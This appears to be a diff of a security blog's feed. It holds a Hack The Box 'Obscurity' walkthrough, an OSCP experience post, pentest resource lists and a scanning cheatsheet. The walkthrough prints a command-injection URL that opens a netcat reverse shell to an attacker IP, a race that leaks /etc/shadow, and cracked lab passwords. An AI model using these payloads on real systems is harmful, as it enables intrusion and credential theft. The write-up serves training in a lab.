@@ -20,7 +20,7 @@ HTB NL Meetup 03 - And we start our journey Jun 17, 2020</description><content t
 </div>
 
 <p>The code of the presentation can be found here:</p>
-<pre><code class="language-console" data-lang="console">https://github.com/ceso/presentations/tree/master/meetup_nl_20200617_starting
+<pre tabindex="0"><code class="language-console" data-lang="console">https://github.com/ceso/presentations/tree/master/meetup_nl_20200617_starting
 </code></pre><h2 id="learning-aws-security-with-flawscloud">Learning AWS Security with flaws.cloud</h2>
 <p>Mar 7, 2021</p>
 <p>Live streaming I gave at twitch going through the challenges at flaws.cloud as a way to learn a little bit about security on AWS.</p>
@@ -52,7 +52,7 @@ For example, what do you want to know the most?</p>
 <h3 id="0x001-what-do-i-need-to-do-to-achieve-my-goals-define-your-way-to-learning">0x001: What do I need to do to achieve my goals? Define your way to learning</h3>
 <p>In Cybersec as any other domain knowledge of IT, everything has pre-requisites (or dependencies), things you should know or have an idea about it, if is the opposite when you are trying to learn something without that knowledge, you will a huge wall or either find an oportunity to learn that knowledge you are lacking.</p>
 <p>Let&rsquo;s make clear what I&rsquo;m talking about with a short example:</p>
-<pre><code class="language-console" data-lang="console">I wanna learn:
+<pre tabindex="0"><code class="language-console" data-lang="console">I wanna learn:
 - A
 - B
 - C
@@ -180,6 +180,7 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://github.com/OWASP/NodeGoat">https://github.com/OWASP/NodeGoat</a></li>
 <li><a href="https://owasp.org/www-project-juice-shop/">https://owasp.org/www-project-juice-shop/</a></li>
 <li><a href="https://portswigger.net/web-security">https://portswigger.net/web-security</a></li>
+<li><a href="https://github.com/bee-san/pyWhat">https://github.com/bee-san/pyWhat</a></li>
 </ul>
 <h4 id="linux-privilege-escalation">Linux Privilege Escalation</h4>
 <ul>
@@ -235,9 +236,18 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
 <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
 </ul>
+<h4 id="red-team">Red Team</h4>
+<ul>
+<li><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li>
+<li><a href="https://www.ired.team/">https://www.ired.team/</a></li>
+<li><a href="https://www.harmj0y.net/blog/">https://www.harmj0y.net/blog/</a> **&lt;&mdash;&mdash; Awesome Active Directory Posts **</li>
+<li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a> <strong>&lt;&mdash;&mdash; Serie about Kerberoasting (5 posts)</strong></li>
+<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</a></li>
+</ul>
 <h4 id="exploit-developmentreversing">Exploit Development/Reversing</h4>
 <ul>
 <li><a href="https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf">https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf</a></li>
+<li><a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/">https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/</a></li>
 <li><a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></li>
 <li><a href="https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator">https://www.virusbulletin.com/virusbulletin/2011/10/okay-so-you-are-win32-emulator</a></li>
 <li><a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf">https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf</a></li>
@@ -283,7 +293,9 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <h4 id="general-hacking-cheatsheetscool-articlespodcasts">General Hacking Cheatsheets/Cool Articles/Podcasts</h4>
 <ul>
 <li><a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md</a></li>
+<li><a href="https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/">https://redtm.com/docs/web-pentest/2021-01-12-web-penetration-testing-task-check-list/</a></li>
 <li><a href="https://github.com/Optixal/OSCP-PWK-Notes-Public/">https://github.com/Optixal/OSCP-PWK-Notes-Public/</a></li>
+<li><a href="https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/">https://epi052.gitlab.io/notes-to-self/blog/2021-06-16-windows-usermode-exploit-development-review/</a></li>
 <li><a href="https://github.com/OlivierLaflamme/Cheatsheet-God/">https://github.com/OlivierLaflamme/Cheatsheet-God/</a></li>
 <li><a href="https://github.com/sinfulz/JustTryHarder/">https://github.com/sinfulz/JustTryHarder/</a></li>
 <li><a href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp</a></li>
@@ -353,15 +365,6 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://github.com/breenmachine/httpscreenshot">https://github.com/breenmachine/httpscreenshot</a></li>
 <li><a href="https://github.com/maaaaz/webscreenshot">https://github.com/maaaaz/webscreenshot</a></li>
 </ul>
-<h4 id="red-team">Red Team</h4>
-<ul>
-<li><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li>
-<li><a href="https://www.ired.team/">https://www.ired.team/</a></li>
-<li><a href="https://www.harmj0y.net/blog/">https://www.harmj0y.net/blog/</a> **&lt;&mdash;&mdash; Awesome Active Directory Posts **</li>
-<li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a> <strong>&lt;&mdash;&mdash; Serie about Kerberoasting (5 posts)</strong></li>
-<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</a></li>
-</ul>
-<h4 id="antivirusedr-evasion">Antivirus/EDR Evasion</h4>
 <h4 id="cool-presentationsvideos">Cool presentations/videos</h4>
 <ul>
 <li>Defeating EDRs using Dynamic Invocation - Jean Francois Maes <a href="https://youtu.be/LXfhyTpQ7TM">https://youtu.be/LXfhyTpQ7TM</a></li>
@@ -381,7 +384,7 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li><a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/">https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/</a></li>
 <li><a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/">https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/</a></li>
 </ul>
-<h4 id="hackers-to-follow-on-twitter-its-a-really-awesome-way-to-learn-as-well-will-keep-adding-them">Hackers to follow on twitter (it&rsquo;s a really awesome way to learn as well!. Will keep adding them)</h4>
+<h4 id="infosec-twitter-accounts-to-follow-its-a-really-awesome-way-to-learn-as-well-will-keep-adding-them">Infosec twitter accounts to follow (it&rsquo;s a really awesome way to learn as well!. Will keep adding them)</h4>
 <ul>
 <li>securibee: <a href="https://twitter.com/securibee">https://twitter.com/securibee</a></li>
 <li>codingo_: <a href="https://twitter.com/codingo_">https://twitter.com/codingo_</a></li>
@@ -405,6 +408,13 @@ Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.
 <li>Rasta Mouse: <a href="https://twitter.com/_RastaMouse">https://twitter.com/_RastaMouse</a></li>
 <li>ippsec: <a href="https://twitter.com/ippsec">https://twitter.com/ippsec</a></li>
 <li>Chema Alonso: <a href="https://twitter.com/chemaalonso">https://twitter.com/chemaalonso</a></li>
+<li>FalconSpy: <a href="https://twitter.com/0xFalconSpy">https://twitter.com/0xFalconSpy</a></li>
+<li>Minh: <a href="https://twitter.com/WhiteHoodHacker">https://twitter.com/WhiteHoodHacker</a></li>
+<li>0verfl0w: <a href="https://twitter.com/0verfl0w_">https://twitter.com/0verfl0w_</a></li>
+<li>Markus Höfer: <a href="https://twitter.com/HashtagMarkus">https://twitter.com/HashtagMarkus</a></li>
+<li>Jonas L: <a href="https://twitter.com/jonasLyk">https://twitter.com/jonasLyk</a></li>
+<li>Will Dormann: <a href="https://twitter.com/wdormann">https://twitter.com/wdormann</a></li>
+<li>Scott Piper: <a href="https://twitter.com/0xdabbad00">https://twitter.com/0xdabbad00</a></li>
 </ul>
 ]]></content></item><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
 I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description><content type="html"><![CDATA[
@@ -419,7 +429,7 @@ I have more machines to do a write-up of, for example some of them are Postman, 
 <p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
 <h2 id="nmap">Nmap</h2>
 <p>We start with nmap to see which ports are there open:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
 Nmap scan report for 10.10.10.168
 Host is up (0.084s latency).
@@ -566,7 +576,7 @@ There are some sections in the page talking about the service by obscurity and p
 <p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
 I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href="https://github.com/ffuf/ffuf">you can get ffuf here</a>.</p>
 <p>Then I proceed to fuzze the server and I got some interesting results:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -766,14 +776,14 @@ MIMES <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;txt
 <p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
 <h2 id="rce">RCE</h2>
 <p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
-<pre><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
+<pre tabindex="0"><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
 </code></pre>
     <img src="/images/htb/obscurity/1-rce.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <h2 id="user">user</h2>
 <p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
 total 60
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
 drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
@@ -794,15 +804,15 @@ drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
 </code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&hellip;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
 <p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
 <p><code>check.txt</code> has an interesting message:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct! 
 </code></pre><p><code>out.txt</code> looks like a ciphered message&hellip;(and from the content of <code>check.txt</code> we know they are related)</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
 out.txt: UTF-8 Unicode text, with NEL line terminators
 www-data@obscure:/home/robert$ cat out.txt
 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
 </code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
 passwordreminder.txt: UTF-8 Unicode text, with no line terminators
 www-data@obscure:/home/robert$ cat passwordreminder.txt 
 ´ÑÈÌÉàÙÁÑé¯·¿k
@@ -895,7 +905,7 @@ print(banner)
             f<span style="color:#f92672">.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
 Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -911,7 +921,7 @@ www-data@obscure:/home/robert$ cat /tmp/foobar
 cat /tmp/foobar
 alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
 </code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -926,7 +936,7 @@ www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 </code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
-<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 www-data@obscure:/home/robert$ su - robert
@@ -936,7 +946,7 @@ Password: SecThruObsFTW
 robert@obscure:~$
 </code></pre><h2 id="root">root</h2>
 <p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
-<pre><code class="language-console" data-lang="console">$ ls -la BetterSSH
+<pre tabindex="0"><code class="language-console" data-lang="console">$ ls -la BetterSSH
 total 12
 drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
@@ -1007,7 +1017,7 @@ session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;u
         print(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
         print(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> print(<span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -1015,12 +1025,12 @@ User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 </code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
 <p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: root
 Enter password: foo
 Incorrect pass
 </code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
 18226
@@ -1028,7 +1038,7 @@ $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M5
 99999
 7
 </code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
 root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -1037,7 +1047,7 @@ mercedes         (root)
 --- SNIP ---
 Session completed
 </code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
-<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
+<pre tabindex="0"><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
 Password:
 root@obscure:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -1101,7 +1111,7 @@ For the report itself, I gave me more freedom with it, the aim yes, was to do so
 <li>Optimum - 10 pts</li>
 </ul>
 <p>Something important to remark, the windows machine I used to the development of the exploit (BOF) was a free one provided by Microsoft that has a valid time of 3 months, so more than enough for this, it can be downloaded here:</p>
-<pre><code class="language-console" data-lang="console">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
+<pre tabindex="0"><code class="language-console" data-lang="console">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
 </code></pre><p>Finally, the 2020/04/11 I started doing a livestream on youtube, and ended rooting all the machines in around 14 hs. <strong>Worth to mention I cut the live stream at around those 14 hs, but youtube only uploaded 12 hs of video, this also was the first time I was streaming something and I didn&rsquo;t know OBS by default didn&rsquo;t do a recording of the videos while streaming, so I don&rsquo;t have the original video to upload the 2 hs missing, but if wanted I just can record that missing parts</strong>, said that, the streaming:</p>
 
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
@@ -1110,7 +1120,7 @@ For the report itself, I gave me more freedom with it, the aim yes, was to do so
 
 <h4 id="01---note-taking">01 - Note Taking</h4>
 <p>When I started my notes were pure shit, I&rsquo;m sure they still are, but are way better than what they were before. For taking/keeping notes through all the PWK and OSCP, I used Cherrytree, I started with <a href="https://411hall.github.io/assets/files/CTF_template.ctb">this template</a>, but as I moved forward and my own methodology started to develop I modified some stuff, the result was having this template:</p>
-<pre><code class="language-console" data-lang="console">https://ceso.github.io/files/oscp/template_pwk.ctb
+<pre tabindex="0"><code class="language-console" data-lang="console">https://ceso.github.io/files/oscp/template_pwk.ctb
 </code></pre><p><strong>Note:</strong> Something I didn&rsquo;t know during the exam, is that in the past some pepole has lost their notes of Cherrytree because the files got corrupted, then they were unable to  prepare their reports, my advice then is, maybe start with Cherrytree, and as time moves on, switch to some another tool for notetaking, such as <a href="https://joplinapp.org/">joplin</a> or <a href="https://notion.so/">Notion</a> to mention two examples, you will already have some methodology developed or starting to, so it will be easier to create a template adapted to yourself.</p>
 <h4 id="10---the-report">10 - The Report</h4>
 <p>Now, for the report I decided to ditch the doc/.odf templates and just go with something I&rsquo;m more comfortable: Markdown.
@@ -1124,9 +1134,9 @@ If you want to read a bit more in deep about this, I recommend you to read <a hr
 </div>
 
 <p>This is the PDF report of the simulation done at the Live Streaming on Youtube:</p>
-<pre><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.pdf
+<pre tabindex="0"><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.pdf
 </code></pre><p>And this, is the markdown code to generate the PDF above:</p>
-<pre><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.md
+<pre tabindex="0"><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.md
 </code></pre><h2 id="100-20200418---the-big-day">100: 20200418 - The Big Day</h2>
 <p>After the simulation, the big day of the exam just arrived, 2020/04/18 at 15 hs started my exam. I didn&rsquo;t do any kind of weird preparation for it, more than keeping a Cherrytree template with the 5 machines ready before the exam (using the one I posted above hosted on this blog), set a sharing folder between my host machine and kali (for not in the world, I wanted something crashing and end up losing everything just because I write only inside the VM), kept ready the templates on markdown for the report of the exam, and a FULL NIGHT OF SLEEP the day before (which I asked as day-off).</p>
 <p>Describing now my exam, it went as follows:</p>
@@ -1165,7 +1175,7 @@ Hope is helpfull for you!</p>
 <h3 id="network-discoverie">Network discoverie</h3>
 <h4 id="nmap">Nmap</h4>
 <p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
-<pre><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
+<pre tabindex="0"><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
 nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
 nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
 
@@ -1178,9 +1188,9 @@ nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
 -oA save the output in normal format, grepable and xml
 -sU scan UDP ports
 </code></pre><p>Is also possible to specify scripts or ports:</p>
-<pre><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
+<pre tabindex="0"><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
 </code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p>
-<pre><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
+<pre tabindex="0"><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
 </code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
 <h4 id="nc--bash">nc + bash</h4>
 <p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p>
@@ -1200,27 +1210,27 @@ top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> 
 </code></pre></div><h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)</h3>
 <p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p>
 <h4 id="devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
-<pre><code class="language-console" data-lang="console">cat &lt; /dev/tcp/192.168.30.253/22
+<pre tabindex="0"><code class="language-console" data-lang="console">cat &lt; /dev/tcp/192.168.30.253/22
 SSH-2.0-OpenSSH_6.2p2 Debian-6
 ^C pressed here
 </code></pre><p>For doing it with udp ports is the same, but changing tcp for udp</p>
 <h4 id="telnet">telnet</h4>
-<pre><code class="language-console" data-lang="console">telnet 192.168.30.253 22
+<pre tabindex="0"><code class="language-console" data-lang="console">telnet 192.168.30.253 22
 SSH-2.0-OpenSSH_6.2p2 Debian-6
 ^C pressed here
 </code></pre><h3 id="web-directoriefile-scanner">Web directorie/file scanner</h3>
 <h4 id="gobuster">Gobuster</h4>
 <p>Scan all the directories/files by extension:</p>
-<pre><code class="language-console" data-lang="console">gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
+<pre tabindex="0"><code class="language-console" data-lang="console">gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
 </code></pre><p>For scanning without extensions, just take out the -x</p>
 <h4 id="nikto">Nikto</h4>
 <p>Sometimes Nikto shows juicy information, I tend to run it like:</p>
-<pre><code class="language-console" data-lang="console">nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
+<pre tabindex="0"><code class="language-console" data-lang="console">nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
 </code></pre><h4 id="fuff">fuff</h4>
 <p>Web fuzzer, <a href="https://github.com/ffuf/ffuf">you can get fuff here</a>, it basically bruteforces the dirs.</p>
-<pre><code class="language-console" data-lang="console">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
+<pre tabindex="0"><code class="language-console" data-lang="console">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
 </code></pre><h3 id="most-usefull-dictionaries-oscphtb">Most usefull dictionaries (OSCP/HTB)</h3>
-<pre><code class="language-console" data-lang="console">/usr/share/wordlists/rockyou.txt
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/wordlists/rockyou.txt
